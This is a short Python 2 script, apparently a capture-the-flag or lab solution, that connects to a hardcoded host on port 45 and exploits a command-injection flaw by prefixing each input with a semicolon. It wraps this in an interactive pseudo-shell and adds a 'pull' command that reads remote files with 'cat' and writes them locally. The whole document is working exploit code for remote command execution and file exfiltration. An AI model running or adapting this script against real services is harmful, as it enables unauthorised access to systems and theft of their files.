import time

import socket

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd(cmd):
    # Establish socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    data = s.recv(1024)       # Receives 1024 bytes from IP/Port

    s.send(cmd)   # Send a newline \n at the end of your command
    time.sleep(2)       # pause to give server time to process the command
    data = s.recv(1024)     # Receives 1024 bytes from IP/Port
    print(data)
    return data

def execute_shell():
    cwd = "/"
    while (1 > 0):
        cmd = "; " + raw_input("%s> " % cwd) + "\n"
        action = cmd.split()
        print(action)
        if cmd == "; exit\n":
            break
        elif action[1] == "cd":
            cwd = action[2]
        elif action[1] == "cat":
            new_cmd = "; cat " + cwd + "/"+ action[2] + "\n"
            execute_cmd(new_cmd)
        elif action[1] == "ls":
            new_cmd = "; ls " + cwd + "\n"
            execute_cmd(new_cmd)
        else:
            execute_cmd(cmd)

def pull(remotePath, localPath):
    data = execute_cmd("; cat %s\n" % remotePath)

    file = open(localPath,"w+")
    file.write(data)

if __name__ == '__main__':
    while (1 > 0):
        cmd = raw_input("$ ")
        action = cmd.split()
        if action[0] == "shell":
            execute_shell()
        elif action[0] == "help":
            print("""1. shell - Drop into an interactive shell and allow users to gracefully exit
2. pull <remote-path> <local-path> - Download files
3. help - Shows this help menu
4. quit - Quit the shell""")
        elif action[0] == "pull":
            pull(action[1], action[2])
        elif action[0] == "quit":
            break
        else:
            print("Invalid command: %s" % cmd)
